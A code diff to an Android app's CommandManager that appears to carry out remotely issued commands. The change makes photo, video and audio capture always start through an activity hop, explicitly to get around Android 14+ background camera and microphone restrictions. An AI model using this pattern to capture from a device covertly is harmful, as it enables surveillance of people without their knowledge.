@@ -183,8 +183,9 @@ object CommandManager {
     }
 
     /**
-     * Starts the action using RemoteTriggerActivity only if the screen is off,
-     * otherwise (screen on/unlocked or app foreground/background) uses the direct service approach.
+     * Always uses RemoteTriggerActivity for audio/photo/video (to copy behavior of apps that succeed
+     * in background on Android 14+), regardless of screen state.
+     * Other actions (location, ring, vibrate) use direct service.
      */
     private fun startActionInvoke(
         context: Context,
@@ -198,80 +199,31 @@ object CommandManager {
     ) {
         when (type) {
             "photo", "video", "audio" -> {
-                if (shouldUseScreenOnActivity(context)) {
-                    // Use activity hop for screen-off/locked
-                    val intent = Intent(context, RemoteTriggerActivity::class.java)
-                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                    intent.putExtra("action", type)
-                    if (type == "photo" || type == "video") {
-                        val cam = camera ?: "front"
-                        val flashEnabled = flash == "true"
-                        val qualityInt = quality?.filter { it.isDigit() }?.toIntOrNull() ?: if (type == "photo") 1080 else 480
-                        val durationMinutes = normalizeDuration(duration)
-                        intent.putExtra("camera", cam)
-                        intent.putExtra("flash", flashEnabled)
-                        intent.putExtra("quality", qualityInt)
-                        intent.putExtra("duration", durationMinutes)
-                    }
-                    if (type == "audio") {
-                        val durationMinutes = normalizeDuration(duration)
-                        intent.putExtra("duration", durationMinutes)
-                    }
-                    chatId?.let { intent.putExtra("chat_id", it) }
-                    intent.putExtra("command_id", commandId)
-                    context.startActivity(intent)
-                } else {
-                    // Direct service approach (background or screen on)
-                    when (type) {
-                        "photo", "video" -> {
-                            val cam = camera ?: "front"
-                            val flashEnabled = flash == "true"
-                            val qualityInt = quality?.filter { it.isDigit() }?.toIntOrNull() ?: if (type == "photo") 1080 else 480
-                            val durationMinutes = normalizeDuration(duration)
-                            ForegroundActionService.startCameraAction(
-                                context,
-                                type,
-                                JSONObject().apply {
-                                    put("camera", cam)
-                                    put("flash", flashEnabled)
-                                    put("quality", qualityInt)
-                                    put("duration", durationMinutes)
-                                },
-                                chatId,
-                                commandId
-                            )
-                        }
-                        "audio" -> {
-                            val durationMinutes = normalizeDuration(duration)
-                            ForegroundActionService.startAudioAction(
-                                context,
-                                JSONObject().apply {
-                                    put("duration", durationMinutes)
-                                },
-                                chatId,
-                                commandId
-                            )
-                        }
-                    }
+                // Always use activity hop for camera/mic actions
+                val intent = Intent(context, RemoteTriggerActivity::class.java)
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                intent.putExtra("action", type)
+                if (type == "photo" || type == "video") {
+                    val cam = camera ?: "front"
+                    val flashEnabled = flash == "true"
+                    val qualityInt = quality?.filter { it.isDigit() }?.toIntOrNull() ?: if (type == "photo") 1080 else 480
+                    val durationMinutes = normalizeDuration(duration)
+                    intent.putExtra("camera", cam)
+                    intent.putExtra("flash", flashEnabled)
+                    intent.putExtra("quality", qualityInt)
+                    intent.putExtra("duration", durationMinutes)
                 }
+                if (type == "audio") {
+                    val durationMinutes = normalizeDuration(duration)
+                    intent.putExtra("duration", durationMinutes)
+                }
+                chatId?.let { intent.putExtra("chat_id", it) }
+                intent.putExtra("command_id", commandId)
+                context.startActivity(intent)
             }
             else -> {
                 startOtherActionInvoke(context, type, duration, chatId, commandId)
             }
-        }
-    }
-
-    /**
-     * Returns true if the screen is off (do activity hop), else returns false (direct service).
-     */
-    private fun shouldUseScreenOnActivity(context: Context): Boolean {
-        val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
-        // Use isInteractive for API 20+, isScreenOn for older
-        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) {
-            !pm.isInteractive
-        } else {
-            @Suppress("DEPRECATION")
-            !pm.isScreenOn
         }
     }
 
